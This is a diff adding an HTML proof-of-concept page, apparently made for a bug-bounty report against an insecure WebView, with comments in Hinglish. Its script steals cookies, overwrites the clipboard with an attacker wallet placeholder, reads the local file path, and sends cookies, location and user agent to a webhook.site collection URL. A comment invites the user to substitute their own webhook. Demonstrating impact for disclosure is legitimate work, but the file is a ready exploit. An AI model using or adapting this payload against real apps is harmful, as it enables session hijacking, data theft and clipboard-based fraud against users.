@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Critical Security Research PoC</title>
+    <style>
+        body { font-family: sans-serif; background: #0d1117; color: white; padding: 20px; text-align: center; }
+        .critical-card { border: 2px solid #f85149; padding: 20px; border-radius: 10px; background: #161b22; }
+        .btn-exploit { background: #da3633; color: white; padding: 15px 25px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="critical-card">
+        <h2>Impact Demo: Session & File Access</h2>
+        <p>This PoC demonstrates how a malicious site can steal sensitive app data.</p>
+        
+        <button class="btn-exploit" onclick="runFullExploit()">Execute Full Impact Test</button>
+        
+        <div id="logs" style="margin-top:20px; color: #7ee787; font-family: monospace; text-align: left;"></div>
+    </div>
+
+    <script>
+        // CHANGE THIS: Apna Webhook URL dalo
+        const attackerServer = "https://webhook.site/f1738809-1a2e-4085-a7d6-e448a2a477b3";
+
+        async function runFullExploit() {
+            const logs = document.getElementById('logs');
+            logs.innerHTML += "> Initializing Exploit...<br>";
+
+            try {
+                // IMPACT 1: COOKIE STEALING (Session Hijacking)
+                // Agar WebView insecurely configured hai, toh ye cookies leak karega
+                const cookies = document.cookie || "No Direct Cookie Access (Sandboxed)";
+                logs.innerHTML += "> Stealing Cookies: " + (cookies.substring(0, 20)) + "...<br>";
+
+                // IMPACT 2: CLIPBOARD HIJACKING (Success Proof)
+                await navigator.clipboard.writeText("ATTACKER_WALLET_ADDRESS_XYZ_123");
+                logs.innerHTML += "> Clipboard Hijacked: Malicious data injected.<br>";
+
+                // IMPACT 3: LOCAL FILE PATH LEAK
+                const currentPath = window.location.href;
+                logs.innerHTML += "> Local Path Leaked: " + currentPath + "<br>";
+
+                // DATA EXFILTRATION (Sending to Attacker)
+                // Hum saara sensitive data ek saath bhej rahe hain
+                fetch(attackerServer + "?victim_data=" + btoa(JSON.stringify({
+                    "cookies": cookies,
+                    "location": currentPath,
+                    "userAgent": navigator.userAgent,
+                    "clipboard": "Modified"
+                })));
+
+                logs.innerHTML += "<br><b style='color:red;'>[!] ALL DATA SENT TO ATTACKER WEBHOOK</b>";
+                alert("Security Alert: Sensitive data has been exfiltrated to the attacker's server!");
+
+            } catch (e) {
+                logs.innerHTML += "> Error during execution: " + e + "<br>";
+            }
+        }
+    </script>
+</body>
+</html>
